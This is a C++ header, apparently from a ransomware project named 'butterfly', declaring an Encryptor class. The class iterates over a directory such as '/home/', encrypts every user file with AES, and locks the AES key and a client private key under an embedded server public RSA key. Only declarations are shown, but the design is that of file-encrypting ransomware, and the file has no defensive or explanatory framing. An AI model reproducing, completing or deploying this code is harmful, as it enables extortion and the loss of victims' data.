
#ifndef BUTTERFLY_ENCRYPTOR_H
#define BUTTERFLY_ENCRYPTOR_H

#include <algorithm>

#include "crypto/cryptoThread.h"
#include "crypto/cryptoSecurity.h"
#include "crypto/rsaEncryptor.h"
#include "crypto/aesEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "directoryIterator.h"
#include "fileExtensions.h"
#include "bflyParams.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Encryptor to encrypt user files with AES. The CPrivateRSA and AESKeyPair(Key+IV) with RSA
 */
class Encryptor : public CryptoThread, CryptoSecurity
{

private:
    int _keySize;

    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
    std::unique_ptr<aes::AESEncryptor> _aesEncryptor;

public:

    /**
     * Constructor Encryptor
     *
     *  Usage:
     *       std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
     *       encryptor->invokeDir("/home/");
     *
     * @param keySize: size of the key
     */
    explicit Encryptor(int keySize = 2048);

    /**
     * Destructor Encryptor
     */
    ~Encryptor() override = default;

    /**
     * Invokes the provided directory path
     *
     * @param path: path of the directory
     * @param protection: enable/disable protection mode
     */
    void invokeDir(const std::string &dirPath, bool protection);

    /**
     * Encrypts the CPrivateRSA.pem and saves the CPrivateRSA.bin file on the host machine
     */
    void encryptCPrivateRSA();

    /**
     * Encrypts all files with AES
     *
     * @param filepath: path of the file
     */
    void encryptFileWithAES(const std::string &filepath);

    /**
     * handles large files with a dedicated thread in base class
     *
     * @param filepath: path of the file
     */
    void handleLargeFilesWithAES(const std::string &filepath) override;

    /**
     * Encrypts the final AES Key and IV with RSA
     *
     * @param aesKeyPair: AES Key and IV String
     */
    void encryptFinalAESKeyWithRSA(const std::string &aesKeyPair);
};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_ENCRYPTOR_H
